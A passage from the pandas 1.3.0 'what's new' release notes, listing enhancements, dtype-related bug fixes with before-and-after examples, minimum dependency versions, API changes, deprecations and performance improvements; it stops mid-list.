:meth:`DataFrame.apply` (:issue:`39140`)\n- :meth:`DataFrame.plot.scatter` can now accept a categorical column for the argument ``c`` (:issue:`12380`, :issue:`31357`)\n- :meth:`Series.loc` now raises a helpful error message when the Series has a :class:`MultiIndex` and the indexer has too many dimensions (:issue:`35349`)\n- :func:`read_stata` now supports reading data from compressed files (:issue:`26599`)\n- Added support for parsing ``ISO 8601``-like timestamps with negative signs to :class:`Timedelta` (:issue:`37172`)\n- Added support for unary operators in :class:`FloatingArray` (:issue:`38749`)\n- :class:`RangeIndex` can now be constructed by passing a ``range`` object directly e.g. ``pd.RangeIndex(range(3))`` (:issue:`12067`)\n- :meth:`Series.round` and :meth:`DataFrame.round` now work with nullable integer and floating dtypes (:issue:`38844`)\n- :meth:`read_csv` and :meth:`read_json` expose the argument ``encoding_errors`` to control how encoding errors are handled (:issue:`39450`)\n- :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all`, and :meth:`.SeriesGroupBy.all` use Kleene logic with nullable data types (:issue:`37506`)\n- :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all`, and :meth:`.SeriesGroupBy.all` return a ``BooleanDtype`` for columns with nullable data types (:issue:`33449`)\n- :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all`, and :meth:`.SeriesGroupBy.all` raising with ``object`` data containing ``pd.NA`` even when ``skipna=True`` (:issue:`37501`)\n- :meth:`.DataFrameGroupBy.rank` and :meth:`.SeriesGroupBy.rank` now supports object-dtype data (:issue:`38278`)\n- Constructing a :class:`DataFrame` or :class:`Series` with the ``data`` argument being a Python iterable that is *not* a NumPy ``ndarray`` consisting of NumPy scalars will now result in a dtype with a precision the maximum of the NumPy scalars; this was already the case when ``data`` is a NumPy ``ndarray`` (:issue:`40908`)\n- Add keyword ``sort`` to :func:`pivot_table` to allow non-sorting of the result (:issue:`39143`)\n- Add keyword ``dropna`` to :meth:`DataFrame.value_counts` to allow counting rows that include ``NA`` values (:issue:`41325`)\n- :meth:`Series.replace` will now cast results to ``PeriodDtype`` where possible instead of ``object`` dtype (:issue:`41526`)\n- Improved error message in ``corr`` and ``cov`` methods on :class:`.Rolling`, :class:`.Expanding`, and :class:`.ExponentialMovingWindow` when ``other`` is not a :class:`DataFrame` or :class:`Series` (:issue:`41741`)\n- :meth:`Series.between` can now accept ``left`` or ``right`` as arguments to ``inclusive`` to include only the left or right boundary (:issue:`40245`)\n- :meth:`DataFrame.explode` now supports exploding multiple columns. Its ``column`` argument now also accepts a list of str or tuples for exploding on multiple columns at the same time (:issue:`39240`)\n- :meth:`DataFrame.sample` now accepts the ``ignore_index`` argument to reset the index after sampling, similar to :meth:`DataFrame.drop_duplicates` and :meth:`DataFrame.sort_values` (:issue:`38581`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.notable_bug_fixes:\n\nNotable bug fixes\n~~~~~~~~~~~~~~~~~\n\nThese are bug fixes that might have notable behavior changes.\n\n.. _whatsnew_130.notable_bug_fixes.categorical_unique_maintains_dtype:\n\n``Categorical.unique`` now always maintains same dtype as original\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, when calling :meth:`Categorical.unique` with categorical data, unused categories in the new array\nwould be removed, making the dtype of the new array different than the\noriginal (:issue:`18291`)\n\nAs an example of this, given:\n\n.. ipython:: python\n\n        dtype = pd.CategoricalDtype(['bad', 'neutral', 'good'], ordered=True)\n        cat = pd.Categorical(['good', 'good', 'bad', 'bad'], dtype=dtype)\n        original = pd.Series(cat)\n        unique = original.unique()\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [1]: unique\n    ['good', 'bad']\n    Categories (2, object): ['bad' < 'good']\n    In [2]: original.dtype == unique.dtype\n    False\n\n*New behavior*:\n\n.. ipython:: python\n\n        unique\n        original.dtype == unique.dtype\n\n.. _whatsnew_130.notable_bug_fixes.combine_first_preserves_dtype:\n\nPreserve dtypes in :meth:`DataFrame.combine_first`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrame.combine_first` will now preserve dtypes (:issue:`7509`)\n\n.. ipython:: python\n\n   df1 = pd.DataFrame({\"A\": [1, 2, 3], \"B\": [1, 2, 3]}, index=[0, 1, 2])\n   df1\n   df2 = pd.DataFrame({\"B\": [4, 5, 6], \"C\": [1, 2, 3]}, index=[2, 3, 4])\n   df2\n   combined = df1.combine_first(df2)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: combined.dtypes\n   Out[2]:\n   A    float64\n   B    float64\n   C    float64\n   dtype: object\n\n*New behavior*:\n\n.. ipython:: python\n\n   combined.dtypes\n\n.. _whatsnew_130.notable_bug_fixes.groupby_preserves_dtype:\n\nGroupby methods agg and transform no longer changes return dtype for callables\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously the methods :meth:`.DataFrameGroupBy.aggregate`,\n:meth:`.SeriesGroupBy.aggregate`, :meth:`.DataFrameGroupBy.transform`, and\n:meth:`.SeriesGroupBy.transform` might cast the result dtype when the argument ``func``\nis callable, possibly leading to undesirable results (:issue:`21240`). The cast would\noccur if the result is numeric and casting back to the input dtype does not change any\nvalues as measured by ``np.allclose``. Now no such casting occurs.\n\n.. ipython:: python\n\n    df = pd.DataFrame({'key': [1, 1], 'a': [True, False], 'b': [True, True]})\n    df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.groupby('key').agg(lambda x: x.sum())\n    Out[5]:\n            a  b\n    key\n    1    True  2\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby('key').agg(lambda x: x.sum())\n\n.. _whatsnew_130.notable_bug_fixes.groupby_reductions_float_result:\n\n``float`` result for :meth:`.DataFrameGroupBy.mean`, :meth:`.DataFrameGroupBy.median`, and :meth:`.GDataFrameGroupBy.var`, :meth:`.SeriesGroupBy.mean`, :meth:`.SeriesGroupBy.median`, and :meth:`.SeriesGroupBy.var`\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously, these methods could result in different dtypes depending on the input values.\nNow, these methods will always return a float dtype. (:issue:`41137`)\n\n.. ipython:: python\n\n    df = pd.DataFrame({'a': [True], 'b': [1], 'c': [1.0]})\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: df.groupby(df.index).mean()\n    Out[5]:\n            a  b    c\n    0    True  1  1.0\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby(df.index).mean()\n\n.. _whatsnew_130.notable_bug_fixes.setitem_column_try_inplace:\n\nTry operating inplace when setting values with ``loc`` and ``iloc``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen setting an entire column using ``loc`` or ``iloc``, pandas will try to\ninsert the values into the existing data rather than create an entirely new array.\n\n.. ipython:: python\n\n   df = pd.DataFrame(range(3), columns=[\"A\"], dtype=\"float64\")\n   values = df.values\n   new = np.array([5, 6, 7], dtype=\"int64\")\n   df.loc[[0, 1, 2], \"A\"] = new\n\nIn both the new and old behavior, the data in ``values`` is overwritten, but in\nthe old behavior the dtype of ``df[\"A\"]`` changed to ``int64``.\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: df.dtypes\n   Out[1]:\n   A    int64\n   dtype: object\n   In [2]: np.shares_memory(df[\"A\"].values, new)\n   Out[2]: False\n   In [3]: np.shares_memory(df[\"A\"].values, values)\n   Out[3]: False\n\nIn pandas 1.3.0, ``df`` continues to share data with ``values``\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.dtypes\n   np.shares_memory(df[\"A\"], new)\n   np.shares_memory(df[\"A\"], values)\n\n\n.. _whatsnew_130.notable_bug_fixes.setitem_never_inplace:\n\nNever operate inplace when setting ``frame[keys] = values``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nWhen setting multiple columns using ``frame[keys] = values`` new arrays will\nreplace pre-existing arrays for these keys, which will *not* be over-written\n(:issue:`39510`).  As a result, the columns will retain the dtype(s) of ``values``,\nnever casting to the dtypes of the existing arrays.\n\n.. ipython:: python\n\n   df = pd.DataFrame(range(3), columns=[\"A\"], dtype=\"float64\")\n   df[[\"A\"]] = 5\n\nIn the old behavior, ``5`` was cast to ``float64`` and inserted into the existing\narray backing ``df``:\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: df.dtypes\n   Out[1]:\n   A    float64\n\nIn the new behavior, we get a new array, and retain an integer-dtyped ``5``:\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.dtypes\n\n\n.. _whatsnew_130.notable_bug_fixes.setitem_with_bool_casting:\n\nConsistent casting with setting into Boolean Series\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSetting non-boolean values into a :class:`Series` with ``dtype=bool`` now consistently\ncasts to ``dtype=object`` (:issue:`38709`)\n\n.. code-block:: ipython\n\n   In [1]: orig = pd.Series([True, False])\n\n   In [2]: ser = orig.copy()\n\n   In [3]: ser.iloc[1] = np.nan\n\n   In [4]: ser2 = orig.copy()\n\n   In [5]: ser2.iloc[1] = 2.0\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [1]: ser\n   Out [1]:\n   0    1.0\n   1    NaN\n   dtype: float64\n\n   In [2]:ser2\n   Out [2]:\n   0    True\n   1     2.0\n   dtype: object\n\n*New behavior*:\n\n.. code-block:: ipython\n\n   In [1]: ser\n   Out [1]:\n   0    True\n   1     NaN\n   dtype: object\n\n   In [2]:ser2\n   Out [2]:\n   0    True\n   1     2.0\n   dtype: object\n\n\n.. _whatsnew_130.notable_bug_fixes.rolling_groupby_column:\n\nDataFrameGroupBy.rolling and SeriesGroupBy.rolling no longer return grouped-by column in values\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe group-by column will now be dropped from the result of a\n``groupby.rolling`` operation (:issue:`32262`)\n\n.. ipython:: python\n\n    df = pd.DataFrame({\"A\": [1, 1, 2, 3], \"B\": [0, 1, 2, 3]})\n    df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [1]: df.groupby(\"A\").rolling(2).sum()\n    Out[1]:\n           A    B\n    A\n    1 0  NaN  NaN\n    1    2.0  1.0\n    2 2  NaN  NaN\n    3 3  NaN  NaN\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby(\"A\").rolling(2).sum()\n\n.. _whatsnew_130.notable_bug_fixes.rolling_var_precision:\n\nRemoved artificial truncation in rolling variance and standard deviation\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`.Rolling.std` and :meth:`.Rolling.var` will no longer\nartificially truncate results that are less than ``~1e-8`` and ``~1e-15`` respectively to\nzero (:issue:`37051`, :issue:`40448`, :issue:`39872`).\n\nHowever, floating point artifacts may now exist in the results when rolling over larger values.\n\n.. ipython:: python\n\n   s = pd.Series([7, 5, 5, 5])\n   s.rolling(3).var()\n\n.. _whatsnew_130.notable_bug_fixes.rolling_groupby_multiindex:\n\nDataFrameGroupBy.rolling and SeriesGroupBy.rolling with MultiIndex no longer drop levels in the result\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n:meth:`DataFrameGroupBy.rolling` and :meth:`SeriesGroupBy.rolling` will no longer drop levels of a :class:`DataFrame`\nwith a :class:`MultiIndex` in the result. This can lead to a perceived duplication of levels in the resulting\n:class:`MultiIndex`, but this change restores the behavior that was present in version 1.1.3 (:issue:`38787`, :issue:`38523`).\n\n\n.. ipython:: python\n\n   index = pd.MultiIndex.from_tuples([('idx1', 'idx2')], names=['label1', 'label2'])\n   df = pd.DataFrame({'a': [1], 'b': [2]}, index=index)\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [1]: df.groupby('label1').rolling(1).sum()\n    Out[1]:\n              a    b\n    label1\n    idx1    1.0  2.0\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.groupby('label1').rolling(1).sum()\n\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_130.api_breaking.deps:\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nSome minimum supported versions of dependencies were updated.\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.17.3          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2017.3          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.7.3           |    X     |         |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.7.0           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 6.0             |          |    X    |\n+-----------------+-----------------+----------+---------+\n| mypy (dev)      | 0.812           |          |    X    |\n+-----------------+-----------------+----------+---------+\n| setuptools      | 38.6.0          |          |    X    |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.4.0           |    X    |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |         |\n+-----------------+-----------------+---------+\n| lxml            | 4.3.0           |         |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.3           |         |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |         |\n+-----------------+-----------------+---------+\n| openpyxl        | 3.0.0           |    X    |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.17.0          |    X    |\n+-----------------+-----------------+---------+\n| pymysql         | 0.8.1           |    X    |\n+-----------------+-----------------+---------+\n| pytables        | 3.5.1           |         |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |         |\n+-----------------+-----------------+---------+\n| scipy           | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.3.0           |    X    |\n+-----------------+-----------------+---------+\n| tabulate        | 0.8.7           |    X    |\n+-----------------+-----------------+---------+\n| xarray          | 0.12.0          |         |\n+-----------------+-----------------+---------+\n| xlrd            | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 1.0.2           |         |\n+-----------------+-----------------+---------+\n| xlwt            | 1.3.0           |         |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 0.12.0          |         |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\n.. _whatsnew_130.api_breaking.other:\n\nOther API changes\n^^^^^^^^^^^^^^^^^\n- Partially initialized :class:`CategoricalDtype` objects (i.e. those with ``categories=None``) will no longer compare as equal to fully initialized dtype objects (:issue:`38516`)\n- Accessing ``_constructor_expanddim`` on a :class:`DataFrame` and ``_constructor_sliced`` on a :class:`Series` now raise an ``AttributeError``. Previously a ``NotImplementedError`` was raised (:issue:`38782`)\n- Added new ``engine`` and ``**engine_kwargs`` parameters to :meth:`DataFrame.to_sql` to support other future \"SQL engines\". Currently we still only use ``SQLAlchemy`` under the hood, but more engines are planned to be supported such as `turbodbc <https://turbodbc.readthedocs.io/en/latest/>`_ (:issue:`36893`)\n- Removed redundant ``freq`` from :class:`PeriodIndex` string representation (:issue:`41653`)\n- :meth:`ExtensionDtype.construct_array_type` is now a required method instead of an optional one for :class:`ExtensionDtype` subclasses (:issue:`24860`)\n- Calling ``hash`` on non-hashable pandas objects will now raise ``TypeError`` with the built-in error message (e.g. ``unhashable type: 'Series'``). Previously it would raise a custom message such as ``'Series' objects are mutable, thus they cannot be hashed``. Furthermore, ``isinstance(<Series>, abc.collections.Hashable)`` will now return ``False`` (:issue:`40013`)\n- :meth:`.Styler.from_custom_template` now has two new arguments for template names, and removed the old ``name``, due to template inheritance having been introducing for better parsing (:issue:`42053`). Subclassing modifications to Styler attributes are also needed.\n\n.. _whatsnew_130.api_breaking.build:\n\nBuild\n^^^^^\n- Documentation in ``.pptx`` and ``.pdf`` formats are no longer included in wheels or source distributions. (:issue:`30741`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_130.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n.. _whatsnew_130.deprecations.nuisance_columns:\n\nDeprecated dropping nuisance columns in DataFrame reductions and DataFrameGroupBy operations\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nCalling a reduction (e.g. ``.min``, ``.max``, ``.sum``) on a :class:`DataFrame` with\n``numeric_only=None`` (the default), columns where the reduction raises a ``TypeError``\nare silently ignored and dropped from the result.\n\nThis behavior is deprecated. In a future version, the ``TypeError`` will be raised,\nand users will need to select only valid columns before calling the function.\n\nFor example:\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2, 3, 4], \"B\": pd.date_range(\"2016-01-01\", periods=4)})\n   df\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [3]: df.prod()\n    Out[3]:\n    Out[3]:\n    A    24\n    dtype: int64\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [4]: df.prod()\n    ...\n    TypeError: 'DatetimeArray' does not implement reduction 'prod'\n\n    In [5]: df[[\"A\"]].prod()\n    Out[5]:\n    A    24\n    dtype: int64\n\n\nSimilarly, when applying a function to :class:`DataFrameGroupBy`, columns on which\nthe function raises ``TypeError`` are currently silently ignored and dropped\nfrom the result.\n\nThis behavior is deprecated.  In a future version, the ``TypeError``\nwill be raised, and users will need to select only valid columns before calling\nthe function.\n\nFor example:\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"A\": [1, 2, 3, 4], \"B\": pd.date_range(\"2016-01-01\", periods=4)})\n   gb = df.groupby([1, 1, 2, 2])\n\n*Old behavior*:\n\n.. code-block:: ipython\n\n    In [4]: gb.prod(numeric_only=False)\n    Out[4]:\n    A\n    1   2\n    2  12\n\n*Future behavior*:\n\n.. code-block:: ipython\n\n    In [5]: gb.prod(numeric_only=False)\n    ...\n    TypeError: datetime64 type does not support prod operations\n\n    In [6]: gb[[\"A\"]].prod(numeric_only=False)\n    Out[6]:\n        A\n    1   2\n    2  12\n\n.. _whatsnew_130.deprecations.other:\n\nOther Deprecations\n^^^^^^^^^^^^^^^^^^\n- Deprecated allowing scalars to be passed to the :class:`Categorical` constructor (:issue:`38433`)\n- Deprecated constructing :class:`CategoricalIndex` without passing list-like data (:issue:`38944`)\n- Deprecated allowing subclass-specific keyword arguments in the :class:`Index` constructor, use the specific subclass directly instead (:issue:`14093`, :issue:`21311`, :issue:`22315`, :issue:`26974`)\n- Deprecated the :meth:`astype` method of datetimelike (``timedelta64[ns]``, ``datetime64[ns]``, ``Datetime64TZDtype``, ``PeriodDtype``) to convert to integer dtypes, use ``values.view(...)`` instead (:issue:`38544`). This deprecation was later reverted in pandas 1.4.0.\n- Deprecated :meth:`MultiIndex.is_lexsorted` and :meth:`MultiIndex.lexsort_depth`, use :meth:`MultiIndex.is_monotonic_increasing` instead (:issue:`32259`)\n- Deprecated keyword ``try_cast`` in :meth:`Series.where`, :meth:`Series.mask`, :meth:`DataFrame.where`, :meth:`DataFrame.mask`; cast results manually if desired (:issue:`38836`)\n- Deprecated comparison of :class:`Timestamp` objects with ``datetime.date`` objects.  Instead of e.g. ``ts <= mydate`` use ``ts <= pd.Timestamp(mydate)`` or ``ts.date() <= mydate`` (:issue:`36131`)\n- Deprecated :attr:`Rolling.win_type` returning ``\"freq\"`` (:issue:`38963`)\n- Deprecated :attr:`Rolling.is_datetimelike` (:issue:`38963`)\n- Deprecated :class:`DataFrame` indexer for :meth:`Series.__setitem__` and :meth:`DataFrame.__setitem__` (:issue:`39004`)\n- Deprecated :meth:`ExponentialMovingWindow.vol` (:issue:`39220`)\n- Using ``.astype`` to convert between ``datetime64[ns]`` dtype and :class:`DatetimeTZDtype` is deprecated and will raise in a future version, use ``obj.tz_localize`` or ``obj.dt.tz_localize`` instead (:issue:`38622`)\n- Deprecated casting ``datetime.date`` objects to ``datetime64`` when used as ``fill_value`` in :meth:`DataFrame.unstack`, :meth:`DataFrame.shift`, :meth:`Series.shift`, and :meth:`DataFrame.reindex`, pass ``pd.Timestamp(dateobj)`` instead (:issue:`39767`)\n- Deprecated :meth:`.Styler.set_na_rep` and :meth:`.Styler.set_precision` in favor of :meth:`.Styler.format` with ``na_rep`` and ``precision`` as existing and new input arguments respectively (:issue:`40134`, :issue:`40425`)\n- Deprecated :meth:`.Styler.where` in favor of using an alternative formulation with :meth:`Styler.applymap` (:issue:`40821`)\n- Deprecated allowing partial failure in :meth:`Series.transform` and :meth:`DataFrame.transform` when ``func`` is list-like or dict-like and raises anything but ``TypeError``; ``func`` raising anything but a ``TypeError`` will raise in a future version (:issue:`40211`)\n- Deprecated arguments ``error_bad_lines`` and ``warn_bad_lines`` in :meth:`read_csv` and :meth:`read_table` in favor of argument ``on_bad_lines`` (:issue:`15122`)\n- Deprecated support for ``np.ma.mrecords.MaskedRecords`` in the :class:`DataFrame` constructor, pass ``{name: data[name] for name in data.dtype.names}`` instead (:issue:`40363`)\n- Deprecated using :func:`merge`, :meth:`DataFrame.merge`, and :meth:`DataFrame.join` on a different number of levels (:issue:`34862`)\n- Deprecated the use of ``**kwargs`` in :class:`.ExcelWriter`; use the keyword argument ``engine_kwargs`` instead (:issue:`40430`)\n- Deprecated the ``level`` keyword for :class:`DataFrame` and :class:`Series` aggregations; use groupby instead (:issue:`39983`)\n- Deprecated the ``inplace`` parameter of :meth:`Categorical.remove_categories`, :meth:`Categorical.add_categories`, :meth:`Categorical.reorder_categories`, :meth:`Categorical.rename_categories`, :meth:`Categorical.set_categories` and will be removed in a future version (:issue:`37643`)\n- Deprecated :func:`merge` producing duplicated columns through the ``suffixes`` keyword  and already existing columns (:issue:`22818`)\n- Deprecated setting :attr:`Categorical._codes`, create a new :class:`Categorical` with the desired codes instead (:issue:`40606`)\n- Deprecated the ``convert_float`` optional argument in :func:`read_excel` and :meth:`ExcelFile.parse` (:issue:`41127`)\n- Deprecated behavior of :meth:`DatetimeIndex.union` with mixed timezones; in a future version both will be cast to UTC instead of object dtype (:issue:`39328`)\n- Deprecated using ``usecols`` with out of bounds indices for :func:`read_csv` with ``engine=\"c\"`` (:issue:`25623`)\n- Deprecated special treatment of lists with first element a Categorical in the :class:`DataFrame` constructor; pass as ``pd.DataFrame({col: categorical, ...})`` instead (:issue:`38845`)\n- Deprecated behavior of :class:`DataFrame` constructor when a ``dtype`` is passed and the data cannot be cast to that dtype. In a future version, this will raise instead of being silently ignored (:issue:`24435`)\n- Deprecated the :attr:`Timestamp.freq` attribute.  For the properties that use it (``is_month_start``, ``is_month_end``, ``is_quarter_start``, ``is_quarter_end``, ``is_year_start``, ``is_year_end``), when you have a ``freq``, use e.g. ``freq.is_month_start(ts)`` (:issue:`15146`)\n- Deprecated construction of :class:`Series` or :class:`DataFrame` with ``DatetimeTZDtype`` data and ``datetime64[ns]`` dtype.  Use ``Series(data).dt.tz_localize(None)`` instead (:issue:`41555`, :issue:`33401`)\n- Deprecated behavior of :class:`Series` construction with large-integer values and small-integer dtype silently overflowing; use ``Series(data).astype(dtype)`` instead (:issue:`41734`)\n- Deprecated behavior of :class:`DataFrame` construction with floating data and integer dtype casting even when lossy; in a future version this will remain floating, matching :class:`Series` behavior (:issue:`41770`)\n- Deprecated inference of ``timedelta64[ns]``, ``datetime64[ns]``, or ``DatetimeTZDtype`` dtypes in :class:`Series` construction when data containing strings is passed and no ``dtype`` is passed (:issue:`33558`)\n- In a future version, constructing :class:`Series` or :class:`DataFrame` with ``datetime64[ns]`` data and ``DatetimeTZDtype`` will treat the data as wall-times instead of as UTC times (matching DatetimeIndex behavior). To treat the data as UTC times, use ``pd.Series(data).dt.tz_localize(\"UTC\").dt.tz_convert(dtype.tz)`` or ``pd.Series(data.view(\"int64\"), dtype=dtype)`` (:issue:`33401`)\n- Deprecated passing lists as ``key`` to :meth:`DataFrame.xs` and :meth:`Series.xs` (:issue:`41760`)\n- Deprecated boolean arguments of ``inclusive`` in :meth:`Series.between` to have ``{\"left\", \"right\", \"neither\", \"both\"}`` as standard argument values (:issue:`40628`)\n- Deprecated passing arguments as positional for all of the following, with exceptions noted (:issue:`41485`):\n\n  - :func:`concat` (other than ``objs``)\n  - :func:`read_csv` (other than ``filepath_or_buffer``)\n  - :func:`read_table` (other than ``filepath_or_buffer``)\n  - :meth:`DataFrame.clip` and :meth:`Series.clip` (other than ``upper`` and ``lower``)\n  - :meth:`DataFrame.drop_duplicates` (except for ``subset``), :meth:`Series.drop_duplicates`, :meth:`Index.drop_duplicates` and :meth:`MultiIndex.drop_duplicates`\n  - :meth:`DataFrame.drop` (other than ``labels``) and :meth:`Series.drop`\n  - :meth:`DataFrame.dropna` and :meth:`Series.dropna`\n  - :meth:`DataFrame.ffill`, :meth:`Series.ffill`, :meth:`DataFrame.bfill`, and :meth:`Series.bfill`\n  - :meth:`DataFrame.fillna` and :meth:`Series.fillna` (apart from ``value``)\n  - :meth:`DataFrame.interpolate` and :meth:`Series.interpolate` (other than ``method``)\n  - :meth:`DataFrame.mask` and :meth:`Series.mask` (other than ``cond`` and ``other``)\n  - :meth:`DataFrame.reset_index` (other than ``level``) and :meth:`Series.reset_index`\n  - :meth:`DataFrame.set_axis` and :meth:`Series.set_axis` (other than ``labels``)\n  - :meth:`DataFrame.set_index` (other than ``keys``)\n  - :meth:`DataFrame.sort_index` and :meth:`Series.sort_index`\n  - :meth:`DataFrame.sort_values` (other than ``by``) and :meth:`Series.sort_values`\n  - :meth:`DataFrame.where` and :meth:`Series.where` (other than ``cond`` and ``other``)\n  - :meth:`Index.set_names` and :meth:`MultiIndex.set_names` (except for ``names``)\n  - :meth:`MultiIndex.codes` (except for ``codes``)\n  - :meth:`MultiIndex.set_levels` (except for ``levels``)\n  - :meth:`Resampler.interpolate` (other than ``method``)\n\n\n.. ---------------------------------------------------------------------------\n\n\n.. _whatsnew_130.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`IntervalIndex.isin` (:issue:`38353`)\n- Performance improvement in :meth:`Series.mean` for nullable data types (:issue:`34814`)\n- Performance improvement in :meth:`Series.isin` for nullable data types (:issue:`38340`)\n- Performance improvement in :meth:`DataFrame.fillna` with ``method=\"pad\"`` or ``method=\"backfill\"`` for nullable floating and nullable integer dtypes (:issue:`39953`)\n- Performance improvement in :meth:`DataFrame.corr` for ``method=kendall`` (:issue:`28329`)\n- Performance improvement in :meth:`DataFrame.corr` for ``method=spearman`` (:issue:`40956`, :issue:`41885`)\n- Performance improvement in :meth:`.Rolling.corr` and :meth:`.Rolling.cov` (:issue:`39388`)\n- Performance improvement in :meth:`.RollingGroupby.corr`, :meth:`.ExpandingGroupby.corr`, :meth:`.ExpandingGroupby.corr` and :meth:`.ExpandingGroupby.cov` (:issue:`39591`)\n- Performance improvement in :func:`unique` for object data type (:issue:`37615`)\n- Performance improvement in :func:`json_normalize` for basic cases (including separators) (:issue:`40035` :issue:`15621`)\n- Performance improvement in :class:`.ExpandingGroupby` aggregation methods (:issue:`39664`)\n- Performance improvement in :class:`.Styler` where render times are more than 50% reduced and now matches :meth:`DataFrame.to_html` (:issue:`39972` :issue:`39952`, :issue:`40425`)\n- The method :meth:`.Styler.set_td_classes` is now as performant as :meth:`.Styler.apply` and :meth:`.Styler.applymap`, and even more so in some cases (:issue:`40453`)\n- Performance improvement in :meth:`.ExponentialMovingWindow.mean` with ``times`` (:issue:`39784`)\n- Performance improvement in :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` when requiring the Python fallback implementation (:issue:`40176`)\n- Performance improvement in the conversion of a PyArrow Boolean array to a pandas nullable Boolean array (:issue:`41051`)\n- Performance improvement for concatenation of data with type :class:`CategoricalDtype` (:issue:`40193`)\n- Performance improvement in :meth:`.DataFrameGroupBy.cummin`, :meth:`.SeriesGroupBy.cummin`, :meth:`.DataFrameGroupBy.cummax`, and 